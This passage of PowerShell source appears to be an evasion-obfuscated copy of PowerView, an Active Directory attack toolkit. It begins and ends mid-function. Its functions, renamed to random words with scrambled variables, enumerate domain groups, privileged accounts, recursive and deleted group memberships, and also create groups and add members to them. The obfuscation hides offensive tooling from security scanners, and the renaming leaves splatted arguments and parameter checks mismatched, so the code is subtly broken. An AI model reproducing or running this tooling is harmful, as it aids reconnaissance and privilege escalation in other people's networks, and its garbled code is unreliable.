                    if ($hDkTAaiv99 -match '^S-1-') {
                        $UztPqXyf99 += "(objectsid=$hDkTAaiv99)"
                    }
                    elseif ($hDkTAaiv99 -match '^CN=') {
                        $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[padlocks] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                            $sMQTvMNR99['Domain'] = $CBPYVhlj99
                            $eSIRuQap99 = bleachers @SearcherArguments
                            if (-not $eSIRuQap99) {
                                Write-Warning "[padlocks] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                            }
                        }
                    }
                    elseif ($hDkTAaiv99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $ouzLqIgS99 = (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                    }
                    elseif ($hDkTAaiv99.Contains('\')) {
                        $zFZKzTFZ99 = $hDkTAaiv99.Replace('\28', '(').Replace('\29', ')') | spokesmen -LkQAjVeR99 Canonical
                        if ($zFZKzTFZ99) {
                            $IoGbncNy99 = $zFZKzTFZ99.SubString(0, $zFZKzTFZ99.IndexOf('/'))
                            $YGzKEtMK99 = $hDkTAaiv99.Split('\')[1]
                            $UztPqXyf99 += "(samAccountName=$YGzKEtMK99)"
                            $sMQTvMNR99['Domain'] = $IoGbncNy99
                            Write-Verbose "[padlocks] Extracted domain '$IoGbncNy99' from '$hDkTAaiv99'"
                            $eSIRuQap99 = bleachers @SearcherArguments
                        }
                    }
                    else {
                        $UztPqXyf99 += "(|(samAccountName=$hDkTAaiv99)(name=$hDkTAaiv99))"
                    }
                }
                if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                    $bNYXjnRz99 += "(|$UztPqXyf99)"
                }
                if ($PSBoundParameters['AdminCount']) {
                    Write-Verbose '[padlocks] Searching for adminCount=1'
                    $bNYXjnRz99 += '(admincount=1)'
                }
                if ($PSBoundParameters['GroupScope']) {
                    $HxfDwsQk99 = $PSBoundParameters['GroupScope']
                    $bNYXjnRz99 = Switch ($HxfDwsQk99) {
                        'DomainLocal'       { '(groupType:1.2.840.113556.1.4.803:=4)' }
                        'NotDomainLocal'    { '(!(groupType:1.2.840.113556.1.4.803:=4))' }
                        'Global'            { '(groupType:1.2.840.113556.1.4.803:=2)' }
                        'NotGlobal'         { '(!(groupType:1.2.840.113556.1.4.803:=2))' }
                        'Universal'         { '(groupType:1.2.840.113556.1.4.803:=8)' }
                        'NotUniversal'      { '(!(groupType:1.2.840.113556.1.4.803:=8))' }
                    }
                    Write-Verbose "[padlocks] Searching for group scope '$HxfDwsQk99'"
                }
                if ($PSBoundParameters['GroupProperty']) {
                    $GZVPyPnY99 = $PSBoundParameters['GroupProperty']
                    $bNYXjnRz99 = Switch ($GZVPyPnY99) {
                        'Security'              { '(groupType:1.2.840.113556.1.4.803:=2147483648)' }
                        'Distribution'          { '(!(groupType:1.2.840.113556.1.4.803:=2147483648))' }
                        'CreatedBySystem'       { '(groupType:1.2.840.113556.1.4.803:=1)' }
                        'NotCreatedBySystem'    { '(!(groupType:1.2.840.113556.1.4.803:=1))' }
                    }
                    Write-Verbose "[padlocks] Searching for group property '$GZVPyPnY99'"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[padlocks] Using additional LDAP filter: $WmhkcxXr99"
                    $bNYXjnRz99 += "$WmhkcxXr99"
                }
                $eSIRuQap99.filter = "(&(objectCategory=group)$bNYXjnRz99)"
                Write-Verbose "[padlocks] filter string: $($eSIRuQap99.filter)"
                if ($PSBoundParameters['FindOne']) { $mKhNNgkp99 = $eSIRuQap99.FindOne() }
                else { $mKhNNgkp99 = $eSIRuQap99.FindAll() }
                $mKhNNgkp99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $Group = $_
                    }
                    else {
                        $Group = Johnson -rtPnFfWd99 $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }
                if ($mKhNNgkp99) {
                    try { $mKhNNgkp99.dispose() }
                    catch {
                        Write-Verbose "[padlocks] Error disposing of the Results object"
                    }
                }
                $eSIRuQap99.dispose()
            }
        }
    }
}
function confections {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $kUBgsWrg99,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $gxUGOEyw99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SBBdRdJC99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    $OIjgjDtk99 = @{
        'Identity' = $kUBgsWrg99
    }
    if ($PSBoundParameters['Domain']) { $OIjgjDtk99['Domain'] = $UtXBFQsM99 }
    if ($PSBoundParameters['Credential']) { $OIjgjDtk99['Credential'] = $fxunRYJT99 }
    $oHCkmxws99 = ethnologist @ContextArguments
    if ($oHCkmxws99) {
        $Group = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList ($oHCkmxws99.Context)
        $Group.SamAccountName = $oHCkmxws99.Identity
        if ($PSBoundParameters['Name']) {
            $Group.Name = $Name
        }
        else {
            $Group.Name = $oHCkmxws99.Identity
        }
        if ($PSBoundParameters['DisplayName']) {
            $Group.DisplayName = $gxUGOEyw99
        }
        else {
            $Group.DisplayName = $oHCkmxws99.Identity
        }
        if ($PSBoundParameters['Description']) {
            $Group.Description = $SBBdRdJC99
        }
        Write-Verbose "[confections] Attempting to create group '$kUBgsWrg99'"
        try {
            $Null = $Group.Save()
            Write-Verbose "[confections] Group '$kUBgsWrg99' successfully created"
            $Group
        }
        catch {
            Write-Warning "[confections] Error creating group '$kUBgsWrg99' : $_"
        }
    }
}
function Skylab {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'LDAPFilter' = '(&(managedBy=*)(groupType:1.2.840.113556.1.4.803:=2147483648))'
            'Properties' = 'distinguishedName,managedBy,samaccounttype,samaccountname'
        }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['SecurityMasks']) { $sMQTvMNR99['SecurityMasks'] = $nZWoutdh99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $sMQTvMNR99['Domain'] = $UtXBFQsM99
            $QNLwMLiv99 = $UtXBFQsM99
        }
        else {
            $QNLwMLiv99 = $Env:USERDNSDOMAIN
        }
        padlocks @SearcherArguments | ForEach-Object {
            $sMQTvMNR99['Properties'] = 'distinguishedname,name,samaccounttype,samaccountname,objectsid'
            $sMQTvMNR99['Identity'] = $_.managedBy
            $Null = $sMQTvMNR99.Remove('LDAPFilter')
            $yYcSesHR99 = great @SearcherArguments
            $spTRgVdd99 = New-Object PSObject
            $spTRgVdd99 | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $spTRgVdd99 | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $spTRgVdd99 | Add-Member Noteproperty 'ManagerName' $yYcSesHR99.samaccountname
            $spTRgVdd99 | Add-Member Noteproperty 'ManagerDistinguishedName' $yYcSesHR99.distinguishedName
            if ($yYcSesHR99.samaccounttype -eq 0x10000000) {
                $spTRgVdd99 | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($yYcSesHR99.samaccounttype -eq 0x30000000) {
                $spTRgVdd99 | Add-Member Noteproperty 'ManagerType' 'User'
            }
            $ysXsGSOy99 = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ysXsGSOy99['Server'] = $YBAlGqrU99 }
            if ($PSBoundParameters['SearchScope']) { $ysXsGSOy99['SearchScope'] = $daZTeEQR99 }
            if ($PSBoundParameters['ResultPageSize']) { $ysXsGSOy99['ResultPageSize'] = $JFYciBwT99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $ysXsGSOy99['ServerTimeLimit'] = $qaKJUqzZ99 }
            if ($PSBoundParameters['Tombstone']) { $ysXsGSOy99['Tombstone'] = $mIpZvziV99 }
            if ($PSBoundParameters['Credential']) { $ysXsGSOy99['Credential'] = $fxunRYJT99 }
            $spTRgVdd99 | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'
            $spTRgVdd99.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $spTRgVdd99
        }
    }
}
function monkeying {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $xLNsZypS99,
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $IOgrercd99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $nZWoutdh99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
        $tOXBGEQK99 = @{}
        if ($PSBoundParameters['Domain']) { $tOXBGEQK99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Server']) { $tOXBGEQK99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['Credential']) { $tOXBGEQK99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        $eSIRuQap99 = bleachers @SearcherArguments
        if ($eSIRuQap99) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $sMQTvMNR99['Identity'] = $soGjewdO99
                $sMQTvMNR99['Raw'] = $True
                $Group = padlocks @SearcherArguments
                if (-not $Group) {
                    Write-Warning "[monkeying] Error searching for group with identity: $soGjewdO99"
                }
                else {
                    $XRuakjMH99 = $Group.properties.item('samaccountname')[0]
                    $lLnlLaWn99 = $Group.properties.item('distinguishedname')[0]
                    if ($PSBoundParameters['Domain']) {
                        $lhOOkUZL99 = $UtXBFQsM99
                    }
                    else {
                        if ($lLnlLaWn99) {
                            $lhOOkUZL99 = $lLnlLaWn99.SubString($lLnlLaWn99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    Write-Verbose "[monkeying] Using LDAP matching rule to recurse on '$lLnlLaWn99', only user accounts will be returned."
                    $eSIRuQap99.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$lLnlLaWn99))"
                    $eSIRuQap99.PropertiesToLoad.AddRange(('distinguishedName'))
                    $mACTrMID99 = $eSIRuQap99.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $sMQTvMNR99.Remove('Raw')
            }
            else {
                $UztPqXyf99 = ''
                $bNYXjnRz99 = ''
                $soGjewdO99 | Where-Object {$_} | ForEach-Object {
                    $hDkTAaiv99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($hDkTAaiv99 -match '^S-1-') {
                        $UztPqXyf99 += "(objectsid=$hDkTAaiv99)"
                    }
                    elseif ($hDkTAaiv99 -match '^CN=') {
                        $UztPqXyf99 += "(distinguishedname=$hDkTAaiv99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $CBPYVhlj99 = $hDkTAaiv99.SubString($hDkTAaiv99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[monkeying] Extracted domain '$CBPYVhlj99' from '$hDkTAaiv99'"
                            $sMQTvMNR99['Domain'] = $CBPYVhlj99
                            $eSIRuQap99 = bleachers @SearcherArguments
                            if (-not $eSIRuQap99) {
                                Write-Warning "[monkeying] Unable to retrieve domain searcher for '$CBPYVhlj99'"
                            }
                        }
                    }
                    elseif ($hDkTAaiv99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $ouzLqIgS99 = (([Guid]$hDkTAaiv99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $UztPqXyf99 += "(objectguid=$ouzLqIgS99)"
                    }
                    elseif ($hDkTAaiv99.Contains('\')) {
                        $zFZKzTFZ99 = $hDkTAaiv99.Replace('\28', '(').Replace('\29', ')') | spokesmen -LkQAjVeR99 Canonical
                        if ($zFZKzTFZ99) {
                            $IoGbncNy99 = $zFZKzTFZ99.SubString(0, $zFZKzTFZ99.IndexOf('/'))
                            $YGzKEtMK99 = $hDkTAaiv99.Split('\')[1]
                            $UztPqXyf99 += "(samAccountName=$YGzKEtMK99)"
                            $sMQTvMNR99['Domain'] = $IoGbncNy99
                            Write-Verbose "[monkeying] Extracted domain '$IoGbncNy99' from '$hDkTAaiv99'"
                            $eSIRuQap99 = bleachers @SearcherArguments
                        }
                    }
                    else {
                        $UztPqXyf99 += "(samAccountName=$hDkTAaiv99)"
                    }
                }
                if ($UztPqXyf99 -and ($UztPqXyf99.Trim() -ne '') ) {
                    $bNYXjnRz99 += "(|$UztPqXyf99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[monkeying] Using additional LDAP filter: $WmhkcxXr99"
                    $bNYXjnRz99 += "$WmhkcxXr99"
                }
                $eSIRuQap99.filter = "(&(objectCategory=group)$bNYXjnRz99)"
                Write-Verbose "[monkeying] monkeying filter string: $($eSIRuQap99.filter)"
                try {
                    $kTrwYNCb99 = $eSIRuQap99.FindOne()
                }
                catch {
                    Write-Warning "[monkeying] Error searching for group with identity '$soGjewdO99': $_"
                    $mACTrMID99 = @()
                }
                $XRuakjMH99 = ''
                $lLnlLaWn99 = ''
                if ($kTrwYNCb99) {
                    $mACTrMID99 = $kTrwYNCb99.properties.item('member')
                    if ($mACTrMID99.count -eq 0) {
                        $DmTPIqaH99 = $False
                        $morDPSes99 = 0
                        $Top = 0
                        while (-not $DmTPIqaH99) {
                            $Top = $morDPSes99 + 1499
                            $vczVLmHE99="member;range=$morDPSes99-$Top"
                            $morDPSes99 += 1500
                            $Null = $eSIRuQap99.PropertiesToLoad.Clear()
                            $Null = $eSIRuQap99.PropertiesToLoad.Add("$vczVLmHE99")
                            $Null = $eSIRuQap99.PropertiesToLoad.Add('samaccountname')
                            $Null = $eSIRuQap99.PropertiesToLoad.Add('distinguishedname')
                            try {
                                $kTrwYNCb99 = $eSIRuQap99.FindOne()
                                $cUWPgabm99 = $kTrwYNCb99.Properties.PropertyNames -like "member;range=*"
                                $mACTrMID99 += $kTrwYNCb99.Properties.item($cUWPgabm99)
                                $XRuakjMH99 = $kTrwYNCb99.properties.item('samaccountname')[0]
                                $lLnlLaWn99 = $kTrwYNCb99.properties.item('distinguishedname')[0]
                                if ($mACTrMID99.count -eq 0) {
                                    $DmTPIqaH99 = $True
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                $DmTPIqaH99 = $True
                            }
                        }
                    }
                    else {
                        $XRuakjMH99 = $kTrwYNCb99.properties.item('samaccountname')[0]
                        $lLnlLaWn99 = $kTrwYNCb99.properties.item('distinguishedname')[0]
                        $mACTrMID99 += $kTrwYNCb99.Properties.item($cUWPgabm99)
                    }
                    if ($PSBoundParameters['Domain']) {
                        $lhOOkUZL99 = $UtXBFQsM99
                    }
                    else {
                        if ($lLnlLaWn99) {
                            $lhOOkUZL99 = $lLnlLaWn99.SubString($lLnlLaWn99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }
            ForEach ($pWTNPYLI99 in $mACTrMID99) {
                if ($xLNsZypS99 -and $mhAMymMg99) {
                    $rtPnFfWd99 = $_.Properties
                }
                else {
                    $VXkGmKAT99 = $sMQTvMNR99.Clone()
                    $VXkGmKAT99['Identity'] = $pWTNPYLI99
                    $VXkGmKAT99['Raw'] = $True
                    $VXkGmKAT99['Properties'] = 'distinguishedname,cn,samaccountname,objectsid,objectclass'
                    $Object = great @ObjectSearcherArguments
                    $rtPnFfWd99 = $Object.Properties
                }
                if ($rtPnFfWd99) {
                    $GAWxUyKZ99 = New-Object PSObject
                    $GAWxUyKZ99 | Add-Member Noteproperty 'GroupDomain' $lhOOkUZL99
                    $GAWxUyKZ99 | Add-Member Noteproperty 'GroupName' $XRuakjMH99
                    $GAWxUyKZ99 | Add-Member Noteproperty 'GroupDistinguishedName' $lLnlLaWn99
                    if ($rtPnFfWd99.objectsid) {
                        $ashraYEA99 = ((New-Object System.Security.Principal.SecurityIdentifier $rtPnFfWd99.objectsid[0], 0).Value)
                    }
                    else {
                        $ashraYEA99 = $Null
                    }
                    try {
                        $bSpnIQOo99 = $rtPnFfWd99.distinguishedname[0]
                        if ($bSpnIQOo99 -match 'ForeignSecurityPrincipals|S-1-5-21') {
                            try {
                                if (-not $ashraYEA99) {
                                    $ashraYEA99 = $rtPnFfWd99.cn[0]
                                }
                                $SWNHVLUL99 = spokesmen -soGjewdO99 $ashraYEA99 -LkQAjVeR99 'DomainSimple' @ADNameArguments
                                if ($SWNHVLUL99) {
                                    $hUOncYaB99 = $SWNHVLUL99.Split('@')[1]
                                }
                                else {
                                    Write-Warning "[monkeying] Error converting $bSpnIQOo99"
                                    $hUOncYaB99 = $Null
                                }
                            }
                            catch {
                                Write-Warning "[monkeying] Error converting $bSpnIQOo99"
                                $hUOncYaB99 = $Null
                            }
                        }
                        else {
                            $hUOncYaB99 = $bSpnIQOo99.SubString($bSpnIQOo99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        $bSpnIQOo99 = $Null
                        $hUOncYaB99 = $Null
                    }
                    if ($rtPnFfWd99.samaccountname) {
                        $vZKCbsyb99 = $rtPnFfWd99.samaccountname[0]
                    }
                    else {
                        try {
                            $vZKCbsyb99 = dotcom -ObjectSID $rtPnFfWd99.cn[0] @ADNameArguments
                        }
                        catch {
                            $vZKCbsyb99 = $rtPnFfWd99.cn[0]
                        }
                    }
                    if ($rtPnFfWd99.objectclass -match 'computer') {
                        $vbfoIAwT99 = 'computer'
                    }
                    elseif ($rtPnFfWd99.objectclass -match 'group') {
                        $vbfoIAwT99 = 'group'
                    }
                    elseif ($rtPnFfWd99.objectclass -match 'user') {
                        $vbfoIAwT99 = 'user'
                    }
                    else {
                        $vbfoIAwT99 = $Null
                    }
                    $GAWxUyKZ99 | Add-Member Noteproperty 'MemberDomain' $hUOncYaB99
                    $GAWxUyKZ99 | Add-Member Noteproperty 'MemberName' $vZKCbsyb99
                    $GAWxUyKZ99 | Add-Member Noteproperty 'MemberDistinguishedName' $bSpnIQOo99
                    $GAWxUyKZ99 | Add-Member Noteproperty 'MemberObjectClass' $vbfoIAwT99
                    $GAWxUyKZ99 | Add-Member Noteproperty 'MemberSID' $ashraYEA99
                    $GAWxUyKZ99.PSObject.TypeNames.Insert(0, 'PowerView.GroupMember')
                    $GAWxUyKZ99
                    if ($PSBoundParameters['Recurse'] -and $bSpnIQOo99 -and ($vbfoIAwT99 -match 'group')) {
                        Write-Verbose "[monkeying] Manually recursing on group: $bSpnIQOo99"
                        $sMQTvMNR99['Identity'] = $bSpnIQOo99
                        $Null = $sMQTvMNR99.Remove('Properties')
                        monkeying @SearcherArguments
                    }
                }
            }
            $eSIRuQap99.dispose()
        }
    }
}
function recuperative {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.DomainGroupMemberDeleted')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $soGjewdO99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $WmhkcxXr99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $nedSgaYy99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YBAlGqrU99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $daZTeEQR99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $JFYciBwT99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $qaKJUqzZ99,
        [Switch]
        $mIpZvziV99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $sMQTvMNR99 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $True
            'LDAPFilter'    =   '(objectCategory=group)'
        }
        if ($PSBoundParameters['Domain']) { $sMQTvMNR99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMQTvMNR99['LDAPFilter'] = $WmhkcxXr99 }
        if ($PSBoundParameters['SearchBase']) { $sMQTvMNR99['SearchBase'] = $nedSgaYy99 }
        if ($PSBoundParameters['Server']) { $sMQTvMNR99['Server'] = $YBAlGqrU99 }
        if ($PSBoundParameters['SearchScope']) { $sMQTvMNR99['SearchScope'] = $daZTeEQR99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMQTvMNR99['ResultPageSize'] = $JFYciBwT99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMQTvMNR99['ServerTimeLimit'] = $qaKJUqzZ99 }
        if ($PSBoundParameters['Tombstone']) { $sMQTvMNR99['Tombstone'] = $mIpZvziV99 }
        if ($PSBoundParameters['Credential']) { $sMQTvMNR99['Credential'] = $fxunRYJT99 }
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $sMQTvMNR99['Identity'] = $soGjewdO99 }
        great @SearcherArguments | ForEach-Object {
            $HfJKdMKz99 = $_.Properties['distinguishedname'][0]
            ForEach($kmMQNyzM99 in $_.Properties['msds-replvaluemetadata']) {
                $aooRtOxg99 = [xml]$kmMQNyzM99 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($aooRtOxg99) {
                    if (($aooRtOxg99.pszAttributeName -Match 'member') -and (($aooRtOxg99.dwVersion % 2) -eq 0 )) {
                        $MZchCEdW99 = New-Object PSObject
                        $MZchCEdW99 | Add-Member NoteProperty 'GroupDN' $HfJKdMKz99
                        $MZchCEdW99 | Add-Member NoteProperty 'MemberDN' $aooRtOxg99.pszObjectDn
                        $MZchCEdW99 | Add-Member NoteProperty 'TimeFirstAdded' $aooRtOxg99.ftimeCreated
                        $MZchCEdW99 | Add-Member NoteProperty 'TimeDeleted' $aooRtOxg99.ftimeDeleted
                        $MZchCEdW99 | Add-Member NoteProperty 'LastOriginatingChange' $aooRtOxg99.ftimeLastOriginatingChange
                        $MZchCEdW99 | Add-Member NoteProperty 'TimesAdded' ($aooRtOxg99.dwVersion / 2)
                        $MZchCEdW99 | Add-Member NoteProperty 'LastOriginatingDsaDN' $aooRtOxg99.pszLastOriginatingDsaDN
                        $MZchCEdW99.PSObject.TypeNames.Insert(0, 'PowerView.DomainGroupMemberDeleted')
                        $MZchCEdW99
                    }
                }
                else {
                    Write-Verbose "[recuperative] Error retrieving 'msds-replvaluemetadata' for '$HfJKdMKz99'"
                }
            }
        }
    }
}
function maturation {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $soGjewdO99,
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        $mACTrMID99,
        [ValidateNotNullOrEmpty()]
        [String]
        $UtXBFQsM99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fxunRYJT99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $OIjgjDtk99 = @{
            'Identity' = $soGjewdO99
        }
        if ($PSBoundParameters['Domain']) { $OIjgjDtk99['Domain'] = $UtXBFQsM99 }
        if ($PSBoundParameters['Credential']) { $OIjgjDtk99['Credential'] = $fxunRYJT99 }
        $almFoXbH99 = ethnologist @ContextArguments
        if ($almFoXbH99) {
            try {
                $Group = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($almFoXbH99.Context, $almFoXbH99.Identity)
            }
            catch {
                Write-Warning "[maturation] Error finding the group identity '$soGjewdO99' : $_"
            }
        }
    }
    PROCESS {
        if ($Group) {
            ForEach ($pWTNPYLI99 in $mACTrMID99) {
                if ($pWTNPYLI99 -match '.+\\.+') {
                    $OIjgjDtk99['Identity'] = $pWTNPYLI99
                    $eejOPAgi99 = ethnologist @ContextArguments
                    if ($eejOPAgi99) {
                        $DGKWisJq99 = $eejOPAgi99.Identity
                    }
                }
                else {
                    $eejOPAgi99 = $almFoXbH99
                    $DGKWisJq99 = $pWTNPYLI99
                }
                Write-Verbose "[maturation] Adding member '$pWTNPYLI99' to group '$soGjewdO99'"
                $pWTNPYLI99 = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity($eejOPAgi99.Context, $DGKWisJq99)
                $Group.Members.Add($pWTNPYLI99)
                $Group.Save()
            }
        }
    }
}
function boxwood {
